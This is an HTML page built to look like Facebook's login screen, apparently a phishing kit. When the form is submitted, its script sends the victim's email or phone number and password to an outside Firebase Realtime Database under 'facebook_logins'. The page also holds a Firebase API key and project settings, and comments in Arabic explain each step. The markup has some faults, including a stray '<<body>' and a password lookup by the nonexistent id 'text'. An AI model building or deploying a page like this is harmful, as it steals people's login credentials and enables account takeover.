<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Log in to Facebook</title>
  <style>
    * {
      padding: 0px;
      margin: 0;
      box-sizing: border-box;
      font-family: Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #f0f2f5;
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .wrapper {
      display: flex;
      max-width: 900px;
      width: 100%;
      padding: 20px;
      justify-content: space-between;
      align-items: center;
    }
    
    .logo-section {
      flex: 1;
      padding-right: 32px;
    }
    
    .logo {
      color: #1877f2;
      font-size: 4rem;
      font-weight: bold;
      margin-bottom: 20px;
    }
    
    .login-form {
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 4px 2px 4px rgba(1, 0, 0, 0.1), 2px 8px 16px rgba(0, 0, 0, 0.1);
      padding: 30px;
      width: 396px;
      flex-shrink: 0;
    }
    
    .login-form input {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 12px;
      border: 1px solid #dddfe2;
      border-radius: 10px;
      font-size: 15px;
    }
    
    .login-btn {
      background-color: #1877f2;
      border: none;
      border-radius: 10px;
      color: #fff;
      font-size: 20px;
      font-weight: bold;
      line-height: 48px;
      padding: 0 16px;
      width: 100%;
      margin-bottom: 16px;
      cursor: pointer;
    }
    
    .login-btn:hover {
      background-color: #166fe5;
    }
    
    .forgot-password {
      color: #1877f2;
      display: block;
      font-size: 14px;
      text-align: center;
      text-decoration: none;
      margin-bottom: 20px;
    }
    
    .divider {
      border-bottom: 2px solid #dadde1;
      margin: 15px 0px;
    }
    
    .create-account {
      background-color: #42b72a;
      border: none;
      border-radius: 10px;
      color: #fff;
      cursor: pointer;
      font-size: 17px;
      font-weight: bold;
      line-height: 48px;
      padding: 0 16px;
      margin: 0 auto;
      display: block;
    }
    
    .create-account:hover {
      background-color: #36a420;
    }
    
    @media (max-width: 900px) {
      body {
        overflow: auto;
      }
      
      .wrapper {
        flex-direction: column;
        text-align: center;
        padding: 40px 20px;
      }
      
      .logo-section {
        padding-right: 0;
        margin-bottom: 10px;
      }
      
      .logo {
        font-size: 3rem;
      }
    }
  </style>
</head>
<<body>
  <div class="wrapper">
    <div class="logo-section">
      <h1 class="logo">facebook</h1>
    </div>
    <div class="login-form">
      <form id="loginForm">
        <input type="text" id="email" placeholder="Email or phone number" required>
        
        <div style="position: relative; width: 100%;">
          <input type="password" id="password" placeholder="Password" required style="padding-right: 45px; margin-bottom: 12px;">
          <button type="button" id="togglePassword" style="position: absolute; right: 15px; top: 14px; border: none; background: none; cursor: pointer; font-size: 16px;">👁️</button>
        </div>

        <button type="submit" class="login-btn">Log In</button>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="divider"></div>
        <button type="button" class="create-account">Create New Account</button>
      </form>
    </div>
  </div>

  <script>
    const passwordInput = document.getElementById('password');
    const togglePasswordButton = document.getElementById('togglePassword');

    togglePasswordButton.addEventListener('click', function () {
      // إذا كان الحقل مخفياً، قم بإظهاره وتغيير الرمز
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        togglePasswordButton.textContent = '🔒'; // رمز لإخفاء كلمة المرور مجدداً
      } else {
        passwordInput.type = 'password';
        togglePasswordButton.textContent = '👁️'; // رمز الإظهار الافتراضي
      }
    });
  </script>
</body>
  <script type="module">
    // 1. استيراد مكتبات Realtime Database المتوافقة من الإنترنت مباشرة
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    // 2. إعدادات مشروعك الحقيقية التي أرسلتها
    const firebaseConfig = {
      apiKey: "AIzaSyDkeUoRzeLLwT26zjlHgUzbU1vnDcweX4o",
      authDomain: "facebool-f49f0.firebaseapp.com",
      databaseURL: "https://facebool-f49f0-default-rtdb.firebaseio.com",
      projectId: "facebool-f49f0",
      storageBucket: "facebool-f49f0.firebasestorage.app",
      messagingSenderId: "1009594237184",
      appId: "1:1009594237184:web:f9a868f1336fa33df2f3e5",
      measurementId: "G-L0JVS244FX"
    };

    // تشغيل الـ Firebase والاتصال بالـ Realtime Database
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // مراقبة ضغط زر تسجيل الدخول وإرسال البيانات
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault(); // يمنع تشغيل الأكشن الافتراضي وإعادة تحميل الصفحة

        const emailValue = document.getElementById('email').value;
        const passwordValue = document.getElementById('text').value;

        try {
            // حفظ البيانات في جدول باسم facebook_logins
            await push(ref(db, 'facebook_logins'), {
                emailOrPhone: emailValue,
                password: passwordValue,
                timestamp: new Date().toISOString()
            });
            
            alert("loading ");
            document.getElementById('loginForm').reset(); // مسح الخانات بعد الإرسال
        } catch (error) {
            alert("حدث خطأ أثناء الإرسال: " + error.message);
        }
    });
  </script>
</body>
</html>
